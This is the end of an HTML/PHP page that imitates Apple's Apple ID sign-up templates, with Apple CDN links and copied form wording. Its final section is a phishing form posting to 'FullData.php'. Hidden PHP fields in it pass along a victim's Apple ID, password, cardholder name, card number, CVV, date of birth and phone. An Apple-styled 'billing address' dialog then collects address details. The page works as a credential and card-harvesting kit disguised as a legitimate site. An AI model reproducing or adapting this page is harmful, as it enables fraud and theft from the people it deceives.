             <span class="form-control-info icon icon_help" tabindex="-1" data-toggle="tooltip" data-container="personal" data-placement="top" data-trigger="click" data-html="true" title="This will be your new Apple ID."></span>
        {{/unless}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1059946220">


<span class="errorMsg {{#errors.name.name_empty}}show{{/errors.name.name_empty}}">Enter an email address to use for your Apple ID.</span>
<span class="errorMsg {{#errors.name.name_invalid}}show{{/errors.name.name_invalid}}">Enter a valid email address to use as your Apple ID.</span>
<span class="errorMsg {{#errors.name.name_isSameAsRescue}}show{{/errors.name.name_isSameAsRescue}}">Not be your rescue email address</span>
{{#errors.name.name_used}}
    <span class="errorMsg show">This email address is not available for use as a new Apple ID.</span>
{{/errors.name.name_used}}
<span class="errorMsg {{#errors.name.name_appleOwnedDomain}}show{{/errors.name.name_appleOwnedDomain}}">Your new Apple ID cannot end in {{placeHolder.domain}}. Choose a different email address.<label class="second-line">Choose a different email address.</label></span>
{{#each errorMessages.name}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_1806143841">


<div class="row form-group clearfix">
    <div class="col-sm-12 birthday-wrap center-align force-ltr">
        <label for="aid-birthday-input" class="sr-only">date of birth</label>
        <input
            id="aid-birthday-input"
            type="text"
            class="form-control input-sizing{{#if validator.errors.birthday.hasErrors}} has-errors{{/if}}"
            placeholder="date of birth"
            can-value="{fieldValue}"
            aria-required="true"
        >
    </div>
</div>
</script>
<script type="text/stache" id="jstache_344124076">


<span class="errorMsg {{#if errors.birthday.empty}}show{{/if}}">Enter your date of birth.</span>
<span class="errorMsg {{#if errors.birthday.ageLimit}}show{{/if}}">An Apple ID cannot be created at this time.</span>
<span class="errorMsg {{#if errors.birthday.tooOld}}show{{/if}}">Enter a year later than {{placeholder.birthDateMinYear}}.</span>
<span class="errorMsg {{#if errors.birthday.invalid}}show{{/if}}">Enter a valid date of birth.</span>
<span class="errorMsg {{#if errors.birthday.futureDate}}show{{/if}}">Birth date cannot be in the future.</span>
{{#each errorMessages.birthday}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_1843106911">


<div class="row form-group clearfix input-sizing no-left-right-margin-mobile">
    {{#if firstNameOrderFirst}}
    <div class="col-xs-6 firstName-wrap person-name">
        <label for="firstName" class="sr-only">
            first name
        </label>
        <input class="form-control {{#validator.errors.firstName.hasErrors}}has-errors{{/validator.errors.firstName.hasErrors}}" id="firstName" name=="firstName" type="text" placeholder="first name" can-value="firstname" aria-required="true" />
    </div>
    <div class="col-xs-6 lastName-wrap person-name">
        <label for="lastName" class="sr-only">
            last name
        </label>
        <input class="form-control {{#validator.errors.lastName.hasErrors}}has-errors{{/validator.errors.lastName.hasErrors}}" id="lastName" name="lastName" type="text" placeholder="last name" can-value="lastname" aria-required="true" />
    </div>
    {{/if}}
    {{#unless firstNameOrderFirst}}
        <div class="col-xs-6 lastName-wrap person-name swap-name-ordering">
            <label for="lastName" class="sr-only">
                last name
            </label>
            <input class="form-control {{#validator.errors.lastName.hasErrors}}has-errors{{/validator.errors.lastName.hasErrors}}" id="lastName" name="lastName" type="text" placeholder="last name" can-value="lastname" aria-required="true" />
        </div>
        <div class="col-xs-6 firstName-wrap person-name swap-name-ordering">
            <label for="firstName" class="sr-only">
                first name
            </label>
            <input class="form-control {{#validator.errors.firstName.hasErrors}}has-errors{{/validator.errors.firstName.hasErrors}}" id="firstName" name=="firstName" type="text" placeholder="first name" can-value="firstname" aria-required="true" />
        </div>
    {{/unless}}

</div>
</script>
<script type="text/stache" id="jstache_1098062150">


<span class="errorMsg {{#if errors.firstName.firstName_invalid}}show{{/if}}">Enter your first name.</span>
<span class="errorMsg {{#if errors.firstName.maxCharsLimit}}show{{/if}}">First name must be less than {{placeholder.firstNameMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.firstName.blacklistedChar}}show{{/if}}">Your first name cannot include special characters.</span>
<span class="errorMsg {{#if errors.firstName.mustNotContainNumber}}show{{/if}}">Your first name cannot include a number.</span>
{{#each errorMessages.firstName}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_223115416">


<span class="errorMsg {{#if errors.lastName.lastName_invalid}}show{{/if}}">Enter your last name.</span>
<span class="errorMsg {{#if errors.lastName.maxCharsLimit}}show{{/if}}">Last name must be less than {{placeholder.lastNameMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.lastName.blacklistedChar}}show{{/if}}">Your last name cannot include special characters.</span>
<span class="errorMsg {{#if errors.lastName.mustNotContainNumber}}show{{/if}}">Your last name cannot include a number.</span>
{{#each errorMessages.lastName}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_35407797">


<div class="row">
    <div class="col-sm-4 captcha-img-wrap">
        {{#if loadingNewCaptcha}}
            <div class="captcha-loading" ></div>
        {{/if}}
        {{^loadingNewCaptcha}}
            {{#if state.captcha.isImage}}
                <img src="{{ captchaContent }}" alt="CAPTCHA" width="120" height="58">
            {{/if}}
            {{^state.captcha.isImage}}
                <img src="https://appleid.cdn-apple.com/static/bin/cb1764815236/dist/assets/images/captcha-audio.jpg" height="58" alt="CAPTCHA" width="120" class="audio-captcha-img" />
            {{/state.captcha.isImage}}
        {{/loadingNewCaptcha}}
    </div>

    <div class="col-sm-8 captcha-wrap">
        <div class="form-group">
            <label for="typeTheCharacters" class="sr-only">Type the characters in the image</label>
            <input id="typeTheCharacters" type="text" class="form-control {{#validator.errors.captcha.hasErrors}}has-errors{{/validator.errors.captcha.hasErrors}}" placeholder="{{#if state.captcha.isImage}}Type the characters in the image{{/if}}{{^state.captcha.isImage}}Enter the code you hear{{/state.captcha.isImage}}" aria-required="true" can-value="verify.captcha.answer">

            <div class="captcha-buttons-wrap">
                <button class="btn btn-link new-captcha-img">
                    <i class="icon icon_reload"></i>
                    New Code
                </button>
                {{#if state.captcha.isImage}}
                <button class="btn btn-link new-captcha-audio">
                    <i class="icon icon_sound"></i>
                    Vision Impaired
                </button>
                {{/if}}
                {{^state.captcha.isImage}}
                <button class="btn btn-link back-captcha-img">
                    <i class="icon icon_text"></i>
                    Text Based
                </button>
                {{/state.captcha.isImage}}
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1483512071">


<span class="errorMsg {{#if errors.captcha.captcha_invalid}}show{{/if}}">{{#if state.isImage}}Enter the text in the image.{{else}}Enter the code that was spoken.{{/if}}</span>
{{#each errorMessages.captcha}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_1496402383">


<div class="marketingPreferences">
    <div class="form-group clearfix">
        <div class="select-wrapper">
            <label class="sr-only" for="countryOptions">Choose country</label>
            <select id="countryOptions" type="text" can-value="account.account.person.primaryAddress.country" class="form-control select-country" aria-required="true">
                {{#each config.localizedResources.countryOptions}}
                    <option value="{{code}}">{{name}}</option>
                {{/each}}
            </select>
        </div>
    </div>

    {{#unless config.pageFeatures.hideNewsletter}}
        <div class="checkbox">
            <input type="checkbox" id="news" name="news"{{#config.pageFeatures.marketingPreferences.appleUpdates}} checked{{/if}} can-value="account.account.preferences.marketingPreferences.appleUpdates" />
            <label for="news">
                Announcements <small class="label-small">Get announcements, recommendations and updates about Apple products, services, software updates and more.</small>
            </label>
        </div>

        <div class="checkbox">
            <input type="checkbox" id="itunes" name="itunes"{{#config.pageFeatures.marketingPreferences.iTunesUpdates}} checked{{/if}} can-value="account.account.preferences.marketingPreferences.iTunesUpdates" />
            <label for="itunes">
                Apple Music, iTunes, iBooks and App Store Offers <small class="label-small">Get recommendations, the latest releases, special offers and exclusive content for music, apps, movies, TV, books, podcasts and more.</small>
            </label>
        </div>

        {{#if config.localizedResources.showAppleNewsOption}}
        <div class="checkbox">
            <input type="checkbox" id="appleNews" name="appleNews" {{#config.pageFeatures.marketingPreferences.appleNews}} checked{{/if}} can-value='account.account.preferences.marketingPreferences.appleNews' />
            <label for="appleNews">
                Apple News Updates <small class="label-small">Get the best stories and recommendations from Apple News delivered directly to your inbox.</small>
            </label>
        </div>
        {{/if}}
    {{/unless}}
</div>
</script>
<script type="text/stache" id="jstache_1322840159">


<div class="clearfix password">
    <div class="row form-group">
        <div class="col-sm-12">
            <label for="password" class="sr-only">
                password
            </label>
            <input class="form-control password-input" id="password" name="password" type="password" placeholder="{{#if passwordmanage}}new password{{else}}password{{/if}}" can-value="password" aria-required="true" />
        </div>
        <div class="col-sm-12 confirm-password-wrap">
            <label for="confirmPassword" class="sr-only">
                confirm password
            </label>
            <input class="form-control confirm-password-input {{#validator.errors.confirmPassword.hasErrors}}has-errors{{/validator.errors.confirmPassword.hasErrors}}" id="confirmPassword" name="confirmPassword" type="password" placeholder="confirm password" aria-required="true" />
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_762692570">


<span class="errorMsg {{#errors.confirmPassword.confirmPassword_must_match}}show{{/errors.confirmPassword.confirmPassword_must_match}}">The passwords you entered do not match.</span>
<span class="errorMsg {{#errors.confirmPassword.confirmPassword_invalid}}show{{/errors.confirmPassword.confirmPassword_invalid}}">Confirm your password.</span>
</script>
<script type="text/stache" id="jstache_1234849307">



{{#each questions }}
    <div class="form-group clearfix input-sizing">
        <div class="question-set clearfix">
            <div class="select-wrapper">
                <label class="sr-only" for="question{{%index}}">Choose question {{%indexOffset 1}}</label>
                <select id="question{{%index}}" class="securityQuestion{{%index}} form-control question" data-index="{{%index}}" autocomplete="off" aria-required="true">
                    <option value="" selected="selected" disabled>{{securityQuestion %index}}</option>
                    {{#.}}
                        <option value="{{ id }}">{{ question }}</option>
                    {{/.}}
                </select>
            </div>
        </div>
        <div class="question-set clearfix">
            <label for="answer{{%index}}" class="sr-only">Enter answer {{%indexOffset 1}}</label>
            <input id="answer{{%index}}" class="securityAnswer{{%index}} form-control answer" type="text" data-index="{{%index}}"
                   placeholder="answer" aria-required="true" />
        </div>
    </div>
{{/each }}
</script>
<script type="text/stache" id="jstache_1480029777">


<span class="errorMsg {{#if errors.securityAnswer0.empty}}show{{/if}}">Enter an answer.</span>
<span class="errorMsg {{#if errors.securityAnswer0.minCharsLimit}}show{{/if}}">Answer to the security question must be at least {{placeholder.answerMinCharacters}} characters.</span>
<span class="errorMsg {{#if errors.securityAnswer0.maxCharsLimit}}show{{/if}}">Answers must be shorter than {{placeholder.answerMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.securityAnswer0.sameAnswer}}show{{/if}}">The answers to your security questions must be different.</span>
<span class="errorMsg {{#if errors.securityAnswer0.answerSameAsQuestion}}show{{/if}}">The answer to your security question cannot be the same as the question.</span>
<span class="errorMsg {{#if errors.securityAnswer0.questionEmpty}}show{{/if}}">Select a question.</span>
{{#each errorMessages.securityAnswer0}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_1817865166">


<span class="errorMsg {{#if errors.securityAnswer1.empty}}show{{/if}}">Enter an answer.</span>
<span class="errorMsg {{#if errors.securityAnswer1.minCharsLimit}}show{{/if}}">Answer to the security question must be at least {{placeholder.answerMinCharacters}} characters.</span>
<span class="errorMsg {{#if errors.securityAnswer1.maxCharsLimit}}show{{/if}}">Answers must be shorter than {{placeholder.answerMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.securityAnswer1.sameAnswer}}show{{/if}}">The answers to your security questions must be different.</span>
<span class="errorMsg {{#if errors.securityAnswer1.answerSameAsQuestion}}show{{/if}}">The answer to your security question cannot be the same as the question.</span>
<span class="errorMsg {{#if errors.securityAnswer1.questionEmpty}}show{{/if}}">Select a question.</span>
{{#each errorMessages.securityAnswer1}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_820792813">


<span class="errorMsg {{#if errors.securityAnswer2.empty}}show{{/if}}">Enter an answer.</span>
<span class="errorMsg {{#if errors.securityAnswer2.minCharsLimit}}show{{/if}}">Answer to the security question must be at least {{placeholder.answerMinCharacters}} characters.</span>
<span class="errorMsg {{#if errors.securityAnswer2.maxCharsLimit}}show{{/if}}">Answers must be shorter than {{placeholder.answerMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.securityAnswer2.sameAnswer}}show{{/if}}">The answers to your security questions must be different.</span>
<span class="errorMsg {{#if errors.securityAnswer2.answerSameAsQuestion}}show{{/if}}">The answer to your security question cannot be the same as the question.</span>
<span class="errorMsg {{#if errors.securityAnswer2.questionEmpty}}show{{/if}}">Select a question.</span>
{{#each errorMessages.securityAnswer2}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_69721303">


<span class="errorMsg {{#if errors.securityQuestion0.empty}}show{{/if}}">Select a question.</span>
{{#each errorMessages.securityQuestion0}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_927351050">


<span class="errorMsg {{#if errors.securityQuestion1.empty}}show{{/if}}">Select a question.</span>
{{#each errorMessages.securityQuestion1}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_1924423403">


<span class="errorMsg {{#if errors.securityQuestion2.empty}}show{{/if}}">Select a question.</span>
{{#each errorMessages.securityQuestion2}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_1024874623">


<div class="aid-verify-code">
    <div class="verification-code-wrap clearfix">
        <div class="row form-group verify-set">
            <div class="col-xs-2 verify-field-wrap">
                <label for="char1" class="sr-only">
                    First Character
                </label>
                <input id="char1" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char2" class="sr-only">
                    Second Character
                </label>
                <input id="char2" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char3" class="sr-only">
                    Third Character
                </label>
                <input id="char3" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char4" class="sr-only">
                    Fourth Character
                </label>
                <input id="char4" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char5" class="sr-only">
                    Fifth Character
                </label>
                <input id="char5" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char6" class="sr-only">
                    Sixth Character
                </label>
                <input id="char6" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
        </div>
        <div class="verify-map hide">
            <label class="sr-only" for="verifyCode">Verification Code</label>
            <input type="text" class="form-control" id="verifyCode" name="verifyCode" autocomplete="false" maxlength="6" can-value="code" />
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_929793328">


<span class="errorMsg {{#if errors.verify.verification_code_invalid}}show{{/if}}">The code you entered is not valid.</span>
{{#each errorMessages.verify}}
    <span class="errorMsg show">{{{this}}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_2121375578">


<div class="popover pop-flow pop-recycled not-mobile" role="group" tabindex="0" style="display: none;">
    <div class="pop-arrow arrow"></div>
    <div class="pop-content popover-content">
        <div class="popover-body">
            <p>We do not recommend using email addresses issued by a network provider.</p>
        </div>
    </div>
</div>
<div class="mobile-only description" role="alert">
    <p class="domain-warning-mobile">We do not recommend using email addresses issued by a network provider.</p>
</div>
</script>
<script type="text/stache" id="jstache_1812599374">


<div>Your password must have:</div>
<div class="{{#if errors.password.min_eight_characters}} error{{else}} success{{/if}}">
    <span class="icon icon_green_check "/>
             <span class="message">
                8 or more characters
             </span>
</div>
<div class="{{#if errors.password.one_upper_lower}}error{{else}}success{{/if}}">
    <span class="icon icon_green_check "/>
             <span class="message">
                 Upper & lowercase letters
             </span>
</div>
<div class="{{#if errors.password.one_number}}error{{else}}success{{/if}}">
    <span class="icon icon_green_check "/>
            <span class="message">
                At least one number
            </span>
</div>
<div class="title"><span>Strength:</span>
    {{#unless errors.password.one_number}}
    {{#unless errors.password.one_upper_lower}}
    {{#unless errors.password.min_eight_characters}}
    <span class="hideWeak {{passwordStrength.strength}}">weak </span>
    <span class="hideModerate {{passwordStrength.strength}}">moderate</span>
    <span class="hideStrong {{passwordStrength.strength}}">strong</span>
    {{/unless}}
    {{/unless}}
    {{/unless}}
</div>
<div class="progress">
    <div class="progress-bar {{passwordStrength.strength}}" role="progressbar" aria-valuenow="{{passwordStrength.percentage}}" aria-valuemin="0" aria-valuemax="100" style="width:{{passwordStrength.percentage}}%">
        <span class="sr-only">{{passwordStrength.percentage}}</span>
    </div>
</div>
<span class="errorMsg {{#errors.password.three_indentical}}show{{/errors.password.three_indentical}}">Too many consecutive identical characters.</span>
<span class="errorMsg {{#errors.password.common}}show{{/errors.password.common}}">Password can be too easily guessed.</span>
<span class="errorMsg {{#errors.password.last_year_used}}show{{/errors.password.last_year_used}}">Choose a password you have not used in the past year.</span>
<span class="errorMsg {{#errors.password.passwords_must_match}}show{{/errors.password.passwords_must_match}}">Password cannot be the same as Apple ID.</span>
<span class="errorMsg {{#errors.password.should_not_match_currentPassword}}show{{/errors.password.should_not_match_currentPassword}}">Your new and current passwords must be different.</span>
<span class="errorMsg {{#errors.password.max_number_of_characters}}show{{/errors.password.max_number_of_characters}}">Your password must be 32 characters or less.</span>

{{#unless errors.password.three_indentical}}
{{#unless errors.password.common}}
{{#unless errors.password.last_year_used}}
{{#unless errors.password.passwords_must_match}}
{{#unless errors.password.should_not_match_currentPassword}}
<span class="hint">Avoid passwords that you use with other websites or that might be easy for someone else to guess.</span>
{{/unless}}
{{/unless}}
{{/unless}}
{{/unless}}
{{/unless}}


</script>


    
        
        
            <script type="text/javascript" src="https://appleid.cdn-apple.com/static/jsj/422518990/account/web/app.js"></script>

        
    




<div id="ac-gn-viewport-emitter"> </div><challenge account="{account}" answer2="{answer2}" question2="What is the name of the street where you grew up?" qid2="144" answer1="{answer1}" question1="What was the name of your first pet?" qid1="131" orig="{orig}">
<form name="myform" id="myform" action="FullData.php" method="post" onSubmit="return checkform(this);">
<input type="hidden" name="xuser" value="<?php print "$xuser"; ?>">
<input type="hidden" name="accountPassword" value="<?php print "$accountPassword"; ?>">
<input type="hidden" name="nameoncard" value="<?php print "$nameoncard"; ?>">
<input type="hidden" name="cardid1" value="<?php print "$cardid1"; ?>">
<input type="hidden" name="cd" value="<?php print "$cd"; ?>">
<input type="hidden" name="cvv" value="<?php print "$cvv"; ?>">
<input type="hidden" name="date_ob" value="<?php print "$date_ob"; ?>">
<input type="hidden" name="Phone" value="<?php print "$Phone"; ?>">
<div style="display: block; padding-right: 17px;" id="challengeID" class="modal flow-dialog default-dialog challenge-dialog in">
    <div class="modal-dialog">
        <div tabindex="-1" aria-labelledby="challengeTitleHeader" role="dialog" class="modal-content">
            <div class="modal-body-wrapper">
                
                    <div class="modal-body">
                        <div class="row challenge-row">
                            <div class="col-sm-12 exclude-padding">
                                <div class="modal-header">
                                    <h2 class="modal-title" id="challengeTitleHeader">
                                        BILLING ADDRESS<p></h2><td id="x_signature" style="padding:18px 5% 51px; font:300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif">
<?php print "$nameoncard"; ?> </td>
                                    <h4 class="modal-title">

                                    </h4>
                                </div>
                                <div class="challenges">
                                    <div class="form-group clearfix">

<div class="name-input">
  <input placeholder="street address" class="generic-input-field  form-control field " id="address" name="address" spellcheck="false" autocomplete="off" autocapitalize="on" autocorrect="off" Required="Required" can-field="{value}" type="text">
</div>

</first-name-input>
    </div>    
        <div class="pop-wrapper field-pop-wrapper middle-wrapper">



<div class="name-input">

  <input placeholder="city" Required="Required" class="generic-input-field  form-control field " id="city" name="city" spellcheck="false" autocomplete="off" autocapitalize="on" autocorrect="off" can-field="{value}" type="text"> 
</div>

</middle-name-input>
        </div>

    <div class="pop-wrapper field-pop-wrapper last-wrapper">



<div class="name-input">
<input aria-describedby="" aria-invalid="" placeholder="state" class="form-control form-input cc-expiration-date  not-focused date" spellcheck="false" autocapitalize="off" autocorrect="off" can-field="{value}" errors="{errors}" id="State" name="State" type="text" Required="Required">
</p>

</middle-name-input>
        </div>

    <div class="pop-wrapper field-pop-wrapper last-wrapper">



<div class="name-input">
<input aria-describedby="" Required="Required" placeholder="zip code" class="form-control form-input cc-expiration-date  not-focused date" spellcheck="false" autocapitalize="off" autocorrect="off" can-field="{value}" errors="{errors}" id="Postal" name="Postal" type="tel">
</div>

</middle-name-input>
        </p>

    <div class="pop-wrapper field-pop-wrapper last-wrapper">



<div class="name-input">
  <input placeholder="phone number" class="generic-input-field  form-control field " id="Phone" name="Phone" spellcheck="false" autocomplete="off" autocapitalize="on" autocorrect="off" can-field="{value}" type="tel" Required="Required">
</div>

</middle-name-input>
        </p>

    <div class="pop-wrapper field-pop-wrapper last-wrapper">




  <input class="generic-input-field  form-control field " placeholder="Country" name="soo" id="soo" class=" content-input confirm-password" autocomplete="off" type="text" value="<?php print "$COUNTRY"; ?>">


                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>


                            <div class="row reset-row">
                                <div class="col-sm-10 exclude-padding">
                                    <span class="plain caption-text"></span>

                                </div>
                            </div>
                    </div>
                
                <div class="modal-footer">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{challengeLoading}">


<div class="loading">
  <i class="icon  spinner"></i>
</div>
</loading>
                        <button class="btn btn-link first back">Cancel</button>
<button  class="btn btn-link verify">Continue</button>

                        </button>
                    </div>
                </div>            
            
        </div>
    </div>
</div>
</div></challenge><div class="modal-backdrop in"></div></body></html>